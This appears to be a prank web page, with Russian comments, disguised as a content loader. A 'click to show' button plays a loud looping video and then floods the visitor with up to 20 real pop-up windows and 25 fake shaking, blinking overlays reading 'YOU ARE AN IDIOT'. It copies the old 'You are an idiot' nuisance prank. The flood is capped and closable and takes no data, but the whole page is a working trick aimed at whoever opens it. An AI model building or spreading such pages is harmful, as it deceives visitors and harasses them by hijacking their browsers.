<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        html, body {
            margin: 0; padding: 0; height: 100%;
            background: #000; overflow: hidden;
            font-family: Arial, sans-serif;
        }
        #start-screen {
            position: fixed; top: 0; left: 0;
            width: 100%; height: 100%;
            display: flex; flex-direction: column;
            align-items: center; justify-content: center;
            background: #000; cursor: pointer; z-index: 9999;
        }
        #start-screen h1 {
            font-size: 22px; color: #fff; margin-bottom: 30px;
        }
        #green-btn {
            background: #00cc44; color: #fff; border: none;
            padding: 18px 40px; font-size: 20px;
            border-radius: 8px; cursor: pointer;
            box-shadow: 0 0 20px rgba(0, 204, 68, 0.6);
        }
        #green-btn:hover { background: #00ff55; }
        #video-container {
            position: fixed; top: 0; left: 0;
            width: 100%; height: 100%;
            z-index: 1; display: none; background: #000;
        }
        #fullscreen-video {
            width: 100%; height: 100%; object-fit: cover;
        }
        .hidden { display: none !important; }

        /* ===== ФЕЙКОВЫЕ ОКНА (работают на телефоне) ===== */
        .fake-popup {
            position: fixed;
            width: 320px;
            max-width: 90vw;
            background: #000;
            border: 3px solid red;
            color: red;
            font-family: monospace;
            text-align: center;
            z-index: 10000;
            box-shadow: 0 0 25px rgba(255,0,0,0.9);
            animation: shake 0.15s infinite;
            user-select: none;
        }
        .fake-popup .popup-title {
            background: red;
            color: white;
            padding: 5px 10px;
            font-size: 12px;
            text-align: left;
            cursor: move;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-weight: bold;
        }
        .fake-popup .popup-close {
            background: black;
            color: red;
            border: none;
            cursor: pointer;
            font-weight: bold;
            padding: 0 8px;
            font-size: 14px;
        }
        .fake-popup .popup-body { padding: 20px 10px; }
        .fake-popup h1 {
            font-size: 28px;
            margin: 0;
            animation: blink 0.4s infinite;
            line-height: 1.1;
        }
        .fake-popup p { margin: 10px 0 0; font-size: 12px; }
        @keyframes blink {
            0% { color: red; }
            50% { color: black; }
            100% { color: red; }
        }
        @keyframes shake {
            0% { transform: translate(0,0); }
            25% { transform: translate(2px,2px); }
            50% { transform: translate(-2px,-2px); }
            75% { transform: translate(2px,-2px); }
            100% { transform: translate(0,0); }
        }
    </style>
</head>
<body>
    <div id="start-screen" onclick="startVideo()">
        <h1>Загрузка контента...</h1>
        <button id="green-btn" onclick="event.stopPropagation(); startVideo();">
            ▶ Нажми, чтобы показать
        </button>
    </div>

    <div id="video-container">
        <video id="fullscreen-video" loop playsinline>
            <source src="video.mp4" type="video/mp4">
        </video>
    </div>

    <script>
        var started = false;
        var spamInterval = null;
        var spamCount = 0;
        var MAX_SPAM = 20;      // сколько РЕАЛЬНЫХ окон пытаться открыть
        var fakeCount = 0;
        var MAX_FAKE = 25;      // сколько ФЕЙКОВЫХ окон создать

        function startVideo() {
            if (started) return;
            started = true;

            document.getElementById('start-screen').classList.add('hidden');
            document.getElementById('video-container').style.display = 'block';

            var video = document.getElementById('fullscreen-video');
            video.muted = false;
            video.volume = 1.0;
            video.play().catch(function(e) {
                console.log('Ошибка автоплея:', e);
            });

            // ===== ЧЕРЕЗ 1 СЕКУНДУ — ХАОС =====
            setTimeout(startChaos, 1000);
        }

        function startChaos() {
            // ---------- 1. РЕАЛЬНЫЕ ОКНА (работают на ПК) ----------
            var w = window.open('', '_blank', 'width=600,height=500');
            if (w) {
                w.document.write(`
                    <html>
                    <head><title>YOU ARE AN IDIOT</title></head>
                    <body style="background:black;color:red;font-family:monospace;
                                 text-align:center;padding-top:50px;overflow:hidden;">
                        <h1 style="font-size:60px;animation:blink 0.4s infinite;">
                            YOU ARE AN IDIOT
                        </h1>
                        <h2 style="font-size:30px;">SURVIVAL FOR THE FITTEST</h2>
                        <button onclick="window.close()" style="font-size:20px;
                                padding:15px 30px;margin-top:30px;
                                background:red;color:white;border:none;
                                cursor:pointer;">CLOSE ME</button>
                        <style>
                            @keyframes blink {
                                0% { color: red; }
                                50% { color: black; }
                                100% { color: red; }
                            }
                            body { animation: shake 0.1s infinite; }
                            @keyframes shake {
                                0% { transform: translate(0,0); }
                                25% { transform: translate(2px,2px); }
                                50% { transform: translate(-2px,-2px); }
                                75% { transform: translate(2px,-2px); }
                                100% { transform: translate(0,0); }
                            }
                        </style>
                    </body>
                    </html>
                `);
            }

            // Дополнительные реальные окна
            spamInterval = setInterval(function() {
                if (spamCount >= MAX_SPAM) {
                    clearInterval(spamInterval);
                    return;
                }
                spamCount++;
                try {
                    var w2 = window.open('', '_blank', 'width=400,height=350');
                    if (w2) {
                        w2.document.write(`
                            <html>
                            <head><title>YOU ARE AN IDIOT</title></head>
                            <body style="background:black;color:red;
                                         font-family:monospace;text-align:center;
                                         padding-top:40px;">
                                <h1 style="font-size:40px;
                                           animation:blink 0.3s infinite;">
                                    YOU ARE AN IDIOT
                                </h1>
                                <p style="font-size:18px;">#` + spamCount + `</p>
                                <button onclick="window.close()"
                                        style="font-size:16px;padding:10px 20px;
                                        background:red;color:white;border:none;
                                        cursor:pointer;margin-top:20px;">
                                    CLOSE ME
                                </button>
                                <style>
                                    @keyframes blink {
                                        0% { color: red; }
                                        50% { color: black; }
                                        100% { color: red; }
                                    }
                                </style>
                            </body>
                            </html>
                        `);
                    }
                } catch(e) {}
            }, 400);

            // ---------- 2. ФЕЙКОВЫЕ ОКНА (работают ВЕЗДЕ, включая телефон) ----------
            var fakeInterval = setInterval(function() {
                if (fakeCount >= MAX_FAKE) {
                    clearInterval(fakeInterval);
                    return;
                }
                fakeCount++;
                createFakePopup(fakeCount);
            }, 350);
        }

        function stopSpam() {
            if (spamInterval) {
                clearInterval(spamInterval);
                spamInterval = null;
            }
        }

        // ===== ФЕЙКОВОЕ ОКНО В DOM =====
        function createFakePopup(index) {
            var popup = document.createElement('div');
            popup.className = 'fake-popup';

            var maxX = Math.max(0, window.innerWidth - 340);
            var maxY = Math.max(0, window.innerHeight - 220);
            popup.style.left = Math.floor(Math.random() * maxX) + 'px';
            popup.style.top = Math.floor(Math.random() * maxY) + 'px';

            popup.innerHTML = `
                <div class="popup-title">
                    <span>⚠ YOU ARE AN IDIOT #${index}</span>
                    <button class="popup-close" title="Закрыть">✕</button>
                </div>
                <div class="popup-body">
                    <h1>YOU ARE AN IDIOT</h1>
                    <p>SURVIVAL FOR THE FITTEST</p>
                </div>
            `;
            document.body.appendChild(popup);

            // Закрытие
            popup.querySelector('.popup-close').addEventListener('click', function(e) {
                e.stopPropagation();
                popup.remove();
            });

            // Перетаскивание (мышь + тач)
            var titleBar = popup.querySelector('.popup-title');
            var dragging = false, offsetX = 0, offsetY = 0;

            function startDrag(x, y) {
                dragging = true;
                offsetX = x - popup.offsetLeft;
                offsetY = y - popup.offsetTop;
                popup.style.animation = 'none';
            }
            function moveDrag(x, y) {
                if (!dragging) return;
                popup.style.left = (x - offsetX) + 'px';
                popup.style.top = (y - offsetY) + 'px';
            }
            function endDrag() {
                if (dragging) {
                    dragging = false;
                    popup.style.animation = 'shake 0.15s infinite';
                }
            }

            titleBar.addEventListener('mousedown', function(e) {
                startDrag(e.clientX, e.clientY);
                e.preventDefault();
            });
            document.addEventListener('mousemove', function(e) {
                moveDrag(e.clientX, e.clientY);
            });
            document.addEventListener('mouseup', endDrag);

            titleBar.addEventListener('touchstart', function(e) {
                var t = e.touches[0];
                startDrag(t.clientX, t.clientY);
                e.preventDefault();
            }, {passive: false});
            document.addEventListener('touchmove', function(e) {
                var t = e.touches[0];
                moveDrag(t.clientX, t.clientY);
            }, {passive: false});
            document.addEventListener('touchend', endDrag);
        }
    </script>
</body>
</html>
